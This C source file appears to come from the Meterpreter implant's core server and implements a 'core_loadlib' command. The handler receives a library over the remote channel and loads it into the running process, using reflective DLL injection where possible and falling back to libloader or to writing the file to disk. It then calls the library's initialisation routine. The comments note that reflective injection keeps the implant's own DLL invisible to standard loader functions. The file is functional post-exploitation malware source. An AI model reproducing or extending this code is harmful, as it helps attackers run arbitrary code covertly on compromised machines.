#include "metsrv.h"

// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;

/**************************
 * Core dispatch routines *
 **************************/
DWORD remote_request_core_console_write(Remote *remote, Packet *packet)
{
	return ERROR_SUCCESS;
}

DWORD remote_response_core_console_write(Remote *remote, Packet *packet)
{
	return ERROR_SUCCESS;
}

/****************************
 * Custom dispatch routines *
 ****************************/

/*
 * core_loadlib
 * ------------
 *
 * Load a library into the address space of the executing process.
 *
 * TLVs:
 *
 * req: TLV_TYPE_LIBRARY_PATH -- The path of the library to load.
 * req: TLV_TYPE_FLAGS        -- Library loading flags.
 * opt: TLV_TYPE_TARGET_PATH  -- The contents of the library if uploading.
 * opt: TLV_TYPE_DATA         -- The contents of the library if uploading.
 *
 * TODO:
 *
 *   - Implement in-memory library loading
 */
DWORD request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	BOOL bLibLoadedReflectivly = FALSE;

	do
	{
		libraryPath = packet_get_tlv_value_string(packet, 
				TLV_TYPE_LIBRARY_PATH);
		flags       = packet_get_tlv_value_uint(packet, 
				TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))
		{
			PCHAR targetPath;
			Tlv dataTlv;

			// Get the library's file contents
			if ((packet_get_tlv(packet, TLV_TYPE_DATA,
					&dataTlv) != ERROR_SUCCESS) ||
			    (!(targetPath = packet_get_tlv_value_string(packet,
					TLV_TYPE_TARGET_PATH))))
			{
				res = ERROR_INVALID_PARAMETER;
				break;
			}

			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
			{
				// try to load the library via its reflective loader...
				library = LoadLibraryR( dataTlv.buffer, dataTlv.header.length );
				if( library == NULL )
				{
					// if that fails, presumably besause the library doesn't support
					// reflective injection, we default to using libloader...
					library = libloader_load_library( targetPath, 
								dataTlv.buffer, dataTlv.header.length );
				}
				else
				{
					bLibLoadedReflectivly = TRUE;
				}

				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
			}
			else
			{
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer, 
						dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
			break;

		// Load the library
		if ((!library) && (!(library = LoadLibrary(libraryPath))))
			res = GetLastError();
		else
			res = ERROR_SUCCESS;

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && (library))
		{
			DWORD (*init)(Remote *remote);

			// if the library was loaded via its reflective loader we must use GetProcAddressR()
			if( bLibLoadedReflectivly )
				(LPVOID)init = (LPVOID)GetProcAddressR( library, "InitServerExtension" );
			else
				(LPVOID)init = (LPVOID)GetProcAddress( library, "InitServerExtension" );

			// patch in the metsrv.dll's HMODULE handle, used by the server extensions for delay loading
			// functions from the metsrv.dll library. We need to do it this way as LoadLibrary/GetProcAddress
			// wont work if we have used Reflective DLL Injection as metsrv.dll will be 'invisible' to these functions.
			remote->hMetSrv = hAppInstance;

			dprintf("Calling init()...");
			// Call the init routine in the library
			if( init )
				res = init(remote);
			dprintf("Called init()...");
		}

	} while (0);

	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);

		packet_transmit(remote, response, NULL);
	}

	dprintf("Returning back to cmd handler...");
	return res;
}

// Dispatch table
Command custom_commands[] = 
{
	{
	  "core_loadlib", 
	  { request_core_loadlib,              { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Registers custom command handlers
 */
VOID register_dispatch_routines()
{
	DWORD index;

	for (index = 0;
	     custom_commands[index].method;
	     index++)
		command_register(&custom_commands[index]);
}

/*
 * Deregisters previously registered custom commands
 */
VOID deregister_dispatch_routines()
{
	DWORD index;

	for (index = 0;
	     custom_commands[index].method;
	     index++)
		command_deregister(&custom_commands[index]);
}
